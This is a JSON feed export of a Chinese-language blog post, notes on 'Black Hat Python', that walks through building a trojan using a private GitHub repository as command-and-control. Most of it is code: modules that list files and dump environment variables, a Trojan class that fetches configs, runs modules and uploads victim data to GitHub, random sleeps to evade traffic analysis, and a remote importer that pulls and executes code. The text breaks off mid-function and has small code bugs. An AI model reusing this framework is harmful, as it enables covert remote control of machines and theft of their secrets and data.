{
    "version": "https://jsonfeed.org/version/1",
    "title": "Or0kit • All posts by \"python\" category",
    "description": "临渊羡鱼，不如退而结网",
    "home_page_url": "https://Or0kit.github.io",
    "items": [
        {
            "id": "https://or0kit.github.io/Programming/Python/%E5%9F%BA%E4%BA%8EGithub%E6%9C%8D%E5%8A%A1%E7%9A%84C&C%E9%80%9A%E4%BF%A1/",
            "url": "https://or0kit.github.io/Programming/Python/%E5%9F%BA%E4%BA%8EGithub%E6%9C%8D%E5%8A%A1%E7%9A%84C&C%E9%80%9A%E4%BF%A1/",
            "title": "基于Github服务的C&C通信",
            "date_published": "2022-05-04T06:11:30.000Z",
            "content_html": "<h1 id=\"楔子\"><a class=\"anchor\" href=\"#楔子\">#</a> 楔子</h1>\n<p>看了 Python 黑帽子一书，记一下笔记。</p>\n<h1 id=\"正文\"><a class=\"anchor\" href=\"#正文\">#</a> 正文</h1>\n<p>想要开发一套实用的木马框架，最大的挑战之一是设计合理的控制、更新和传输数据的方案。</p>\n<h2 id=\"基于github服务的cc通信\"><a class=\"anchor\" href=\"#基于github服务的cc通信\">#</a> 基于 Github 服务的 C&amp;C 通信</h2>\n<p>本章利用 Github 作为存放木马配置、窃取受害者系统数据的通道，并且将木马执行任务所需的所有模块都托管在 Github 上。</p>\n<p>“魔改” Python 原生的导入机制，这样创建新的木马模块后，木马就能自动从仓库里直接拉取这些模块以及任何需要依赖的第三方库</p>\n<p>好处：</p>\n<ol>\n<li>和 Github 之间的通信流量都是经过 SSL 加密的。</li>\n<li>公司内网一般不会禁用 Github。</li>\n</ol>\n<p>使用私有仓库，以防有人窥探我们的行动。</p>\n<h3 id=\"第一步\"><a class=\"anchor\" href=\"#第一步\">#</a> 第一步</h3>\n<details class=\"info\"><summary>创建Github仓库</summary><div>\n<p>注册 Github 账号就不说了，创建一个名字叫  <code>bhptrojan</code>  的新仓库。</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>安装 python 版本的 Github API 库：  <code>pip3 install github3.py</code></p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>在本地创建这个仓库的基本结构。在命令行中输入以下内容：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mkdir</span> bhptrojan</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">cd</span> bhptrojan</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">git</span> init</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">mkdir</span> modules</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">mkdir</span> config</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">mkdir</span> data</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">touch</span> .gitignore</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">git</span> <span class=\"token function\">add</span> <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">git</span> commit -m <span class=\"token string\">\"Adds repo structure for trojan.\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">git</span> remote <span class=\"token function\">add</span> origin https://github.com/<span class=\"token operator\">&lt;</span>YourUserName<span class=\"token operator\">></span>/bhptrojan.git</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">git</span> push origin master</pre></td></tr></table></figure><p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p>可能需要科学上网！</p>\n<p>这样就创建了仓库的初始结构。<br />\n其中  <code>config</code>  目录存放这每种木马独有的配置文件。这样部署木马时，你会希望每种木马执行不同的任务，所以每种木马应该检查各自的配置文件。<br />\n <code>modules</code>  目录存放这各种模块可供木马选用。我们会修改 Python 的导入机制，让木马能够从 GitHUb 仓库里直接导入这些模块。<br />\n有了这种远程导入能力，你就能通过 GitHub 下发各种第三方库，避免每次添加新功能或依赖时都重新编译打包可执行木马文件。<br />\n最后  <code>data</code>  目录则是木马用来上交它们收集到的数据的地方。</p>\n<p>也可以创建一个 GitHub 个人访问令牌，当通过 HTTPS 与 GItHub API 交互时，可以用令牌代替你的密码。<br />\n这个书中让参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vZW4vYXV0aGVudGljYXRpb24=\">https://docs.github.com/en/authentication</span></p>\n<p>创建完令牌后保存在 mytoken.txt 中。记得添加到  <code>.gitignore</code>  中，这样就不会把身份凭证推送到仓库里了。</p>\n</div></details>\n<h3 id=\"第二步\"><a class=\"anchor\" href=\"#第二步\">#</a> 第二步</h3>\n<details class=\"info\"><summary>编写一些简单的模块</summary><div>\n<p>在  <code>module</code>  文件夹下创建两个模块一个为  <code>dirlister.py</code> ，另一个为  <code>environment.py</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2Rpcmxpc3Rlci5weQ==\">dirlister.py</span>:</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token operator\">**</span>args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    会把当前目录下所有文件列出来，并将一个结果拼成一个字符串返回。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] In dirlister module.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    files <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>listdir<span class=\"token punctuation\">(</span><span class=\"token string\">\".\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>files<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token operator\">**</span>args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    这个模块仅仅收集远程设备上所设定的所有环境变量</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] In environment module.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> os<span class=\"token punctuation\">.</span>environ</pre></td></tr></table></figure><p>开发的每个模块都应该提供一个接受若干个参数的 run 函数，这样技能以一个相对统一的形式来加载每个模块，又能通过定制配置文件给每个模块传递不同的参数。</p>\n<p>接下了将这些代码推到 GitHub 仓库上，以便木马使用。</p>\n<p>执行一下命令：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">git</span> <span class=\"token function\">add</span> <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">git</span> commit -m <span class=\"token string\">\"Add new modules.\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">git</span> push origin master</pre></td></tr></table></figure><p>可以看到代码被推到 GitHub 仓库里了。</p>\n<p>这就是开发木马的工作流程，可以添加一些更复杂的木马模块，巩固所学。</p>\n</div></details>\n<h3 id=\"第三步\"><a class=\"anchor\" href=\"#第三步\">#</a> 第三步</h3>\n<details class=\"info\"><summary>编写木马配置文件</summary><div>\n<p>我们会设定让每个木马去检查  <code>config</code>  目录中的  <code>TROJANID.json</code>  文件，它是一个简单的 JSON 文档，可以解析它、把它转换成 Python 字典，然后根据里面的信息操控木马的行为。</p>\n<p>在 <code>config</code>  目录下创建一个 <code>abc.json</code> , 并输入以下内容:</p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token property\">\"module\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"dirlister\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token property\">\"module\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"environment\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>这里只是简单列出了木马应该运行那些模块。</p>\n<p>当然这里也可以添加一些额外的使用选项，比如模块执行的时间、模块的执行次数，或是传递给模块的参数。</p>\n<p>然后在主仓库目录下执行一下命令：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">git</span> <span class=\"token function\">add</span> <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">git</span> commit -m <span class=\"token string\">\"Add simple configuration.\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">git</span> push origin master</pre></td></tr></table></figure></div></details>\n<h3 id=\"第四步\"><a class=\"anchor\" href=\"#第四步\">#</a> 第四步</h3>\n<details class=\"info\"><summary>构建基于GitHub通信的木马</summary><div>\n<p>木马主体会从 GitHub 获取配置信息和要执行的代码。<br />\n首先我们先编写一批函数用于连接、鉴权以及调用 GitHub API。新建一个文件明明为： <code>git_trojan.py</code></p>\n<p>先包含必要的库：</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> github3</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> importlib</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> json</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">from</span> datetime <span class=\"token keyword\">import</span> datetime</pre></td></tr></table></figure><p>编写与木马相关的 GitHub 代码：</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">github_connect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'mytoken.txt'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        token <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    user <span class=\"token operator\">=</span> <span class=\"token string\">'tiarno'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    sess <span class=\"token operator\">=</span> github3<span class=\"token punctuation\">.</span>login<span class=\"token punctuation\">(</span>token<span class=\"token operator\">=</span>token<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> sess<span class=\"token punctuation\">.</span>repository<span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">,</span> <span class=\"token string\">'bhptrojan'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_file_contents</span><span class=\"token punctuation\">(</span>dirname<span class=\"token punctuation\">,</span>module_name<span class=\"token punctuation\">,</span>repo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> repo<span class=\"token punctuation\">.</span>file_contents<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>dirname<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">/</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>module_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这两个函数会处理和 GitHub 仓库之间的交互。</p>\n<p><code>github_connect</code>  函数会读取在 GitHub 上创建的令牌。<br />\n在创建令牌时，将它保存到了一个名为  <code>mytoken.txt</code>  的文件中。<br />\n现在我们该从改文件中读取令牌，并创建一个  <code>GitHub</code>  仓库连接。<br />\n我们可以给不同的木马创建不同的令牌，这样就能控制每个木马有权访问哪些数据。即使受害者捕获了木马，也无法溯源并删除你的所有数据。</p>\n<p><code>get_file_contents</code>  函数会接受文件名、模块名以及一个 GitHub 连接作为参数，并返回相应模块的内容。<br />\n这个函数负责从远处仓库里抓取文件并读取里面的数据。我们会用它读取配置文件和模块源代码。</p>\n<p>现在我们来编写 Trojan 类，它负责执行基本的木马任务：</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Trojan</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> <span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        初始化木马对象，设定好它的配置文件和数据目录路径（用于上报木马的输出结果），然后连接GitHub仓库。</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        \"\"\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        self<span class=\"token punctuation\">.</span><span class=\"token builtin\">id</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">id</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        self<span class=\"token punctuation\">.</span>config_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.json'</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        self<span class=\"token punctuation\">.</span>data_path <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'data/</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">/'</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        self<span class=\"token punctuation\">.</span>repo <span class=\"token operator\">=</span> github_connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>下面编写和 GitHub 仓库通信时所需的函数：</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_config</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    从仓库中读取远程配置文件，这样木马就知道该运行那些模块，并通过调用exec函数将模块内容引入木马对象。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    config_json <span class=\"token operator\">=</span> get_file_contents<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token string\">'config'</span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>config_file<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>repo</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    config <span class=\"token operator\">=</span> json<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>config_json<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span> task <span class=\"token keyword\">in</span> config<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> task<span class=\"token punctuation\">[</span><span class=\"token string\">'module'</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> sys<span class=\"token punctuation\">.</span>modules<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"import %s\"</span> <span class=\"token operator\">%</span> task<span class=\"token punctuation\">[</span><span class=\"token string\">'module'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">return</span> config</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">module_runner</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> module<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    函数会调用刚才所引入模块的run函数。</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    result <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>modules<span class=\"token punctuation\">[</span>module<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    self<span class=\"token punctuation\">.</span>store_module_result<span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">store_module_result</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    函数会创建一个文件，其文件名包含当前日期和时间，然后将模块的输出结果存在这个文件中。</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    message <span class=\"token operator\">=</span> datetime<span class=\"token punctuation\">.</span>now<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>isformat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    remote_path <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'data/</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>self<span class=\"token punctuation\">.</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">/</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>message<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.data'</span></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    bindata <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token string\">'%r'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">,</span> <span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    self<span class=\"token punctuation\">.</span>repo<span class=\"token punctuation\">.</span>create_file<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        remote_path<span class=\"token punctuation\">,</span> message<span class=\"token punctuation\">,</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>bindata<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>我们的木马会利用这个三个函数，把从目标设备上收集到的数据推送到 GitHub 上。</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    执行任务</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\"># 从仓库中拉取配置文件</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        config <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>get_config<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">for</span> task <span class=\"token keyword\">in</span> config<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token comment\"># 把模块交给一个独立的线程去执行。</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            thread <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                target<span class=\"token operator\">=</span>self<span class=\"token punctuation\">.</span>module_runner<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>task<span class=\"token punctuation\">[</span><span class=\"token string\">'module'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            thread<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">30</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>在 run 函数中，我们开始执行这些任务。</p>\n<p>进入 module_runner 函数后，我们调用模块的 run 函数执行之中的代码。当它执行结束后，应该会输出一个字符串，我们会把这个字符串推送到 GitHub 上。</p>\n<p>每执行完一个任务，木马安都会随机休眠一段时间，以尝试绕过防守方的流量特征分析。当然也可以创建一堆指向 Google 的流量，回事访问一些正常网站，以此来伪装木马。</p>\n</div></details>\n<h3 id=\"第五步\"><a class=\"anchor\" href=\"#第五步\">#</a> 第五步</h3>\n<details class=\"info\"><summary>深入探索Python的import功能</summary><div>\n<p>在我们操纵的远程设备上难免会用到这个设备上不存在的包，然而远程安装软件包是件很麻烦的事。<br />\n除此之外，我们还希望每次添加一项依赖（比如 scapy）之后，可以确保每个模块都能用上这个依赖。</p>\n<p>Python 允许我们改动导入模块的过程，如果没能在本地找到某个模块，就会调用我们定义的 import 类，这样就能从我们的仓库远程拉取代码。<br />\n我们要把编写的这个类添加到  <code>sys.meta_path</code>  列表中。</p>\n<p>现在构建这个类：</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">GitImporter</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        self<span class=\"token punctuation\">.</span>current_module_code <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">find_module</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> path<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] Attempting to retrieve %s\"</span> <span class=\"token operator\">%</span> name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        self<span class=\"token punctuation\">.</span>repo <span class=\"token operator\">=</span> github_connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        new_library <span class=\"token operator\">=</span> get_file_contents<span class=\"token punctuation\">(</span><span class=\"token string\">'modules'</span><span class=\"token punctuation\">,</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.py'</span></span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>repo<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">if</span> new_library <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            self<span class=\"token punctuation\">.</span>current_module_code <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token 